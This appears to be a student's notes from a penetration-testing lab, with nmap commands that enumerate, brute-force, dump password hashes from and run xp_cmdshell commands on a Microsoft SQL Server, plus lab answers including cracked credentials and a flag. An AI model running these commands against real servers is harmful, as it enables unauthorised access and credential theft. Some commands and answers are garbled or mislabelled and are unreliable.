#### Tools
nmp

#### Commands

Get information on mysql server
```
nmap target_ip -p mysql_port --script ms-sql-info
```

Get information on ntlm server
```
nmap target_ip -p mysql_port --script ms-sql-ntlm-info --script=args mssql.instance-port=1443
```

Brute force mysql server with usernames and passwords
```
nmap target_ip -p mysql_port --script ms-sql-brute --script=args userdb=/root/Desktop/worlist/common_usrs.txt,passdb=/root/Desktop/worlist/100-common-passwords.txt
```

Check server for empty password logins
```
nmap target_ip -p mysql_port --script ms-sql-empty-password
```


Extract sys users from master..syslogins ? 
```
nmap target_ip -p mysql_port --script ms-sql-query --script-args mssql.username=admin,mssql.password=password,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt
```

Dump hashes through nmap
```
nmap target_ip -p mysql_port --script ms-sql-dump-hashes --script=args mssql.username=admin,mssql.password=password
```

Execute command on server with nmap
```
nmap target_ip -p mysql_port --script ms-sql-xp-cmdshell --script=args mssql.username=admin,mssql.password=password,ms-sql-cmdshell.cmd="ipconfig"
```

Grab flag from remote mysql server
```
nmap target_ip -p mysql_port --script ms-sql-xp-cmdshell --script=args mssql.username=admin,mssql.password=password,ms-sql-cmdshell.cmd="type c:\flag.txt"
```

#### Questions

10.4.20.236

1.  Identify MSSQL Database Server
   
```
nmap -sS -sV -p- -T 4  10.4.20.236  -v 

49679/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000


nmap --script ms-sql-info.nse -p 1433 10.4.20.236
```
   
2.  Find information from the MSSQL server with NTLM.
   
```
nmap --script ms-sql-ntlm-info.nse -p 1433 10.4.20.236 

1433/tcp open  ms-sql-s
| ms-sql-ntlm-info: 
|   Target_Name: MSSQL-SERVER
|   NetBIOS_Domain_Name: MSSQL-SERVER
|   NetBIOS_Computer_Name: MSSQL-SERVER
|   DNS_Domain_Name: MSSQL-Server
|   DNS_Computer_Name: MSSQL-Server
|_  Product_Version: 10.0.14393

```
   
3.  Enumerate all valid MSSQL users and passwords
   
```
   
```
   
4.  Identify 'sa' user password
   
```
   
```
   
5.  Execute MSSQL query to extract sysusers
   
```
   
```
   
6.  Dump MSSQL users hashes
   
```
   
```
   
7.  Execute a command on MSSQL to retrieve the flag. (The flag is located inside C:\flag.txt)
   
```
   
```
   
nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt <host>

#### Answers
1. Microsoft SQL Server 2019 15.00.2000
2. target name, production version 
3. aduitor:jasmine1 , dbadmin:bubbles1, admin:anamaria
4. nmap -p 1433 --script
5. nmap -p 1433 -sV target_ip --script=ms-sql-dump-hashes --script-agrs=mssql.username=admin,mssql.password=anamaria
6. 
7. 1d1803570245aa620446518b2154f324


#### Notes
sysuser sin this case have no password ? 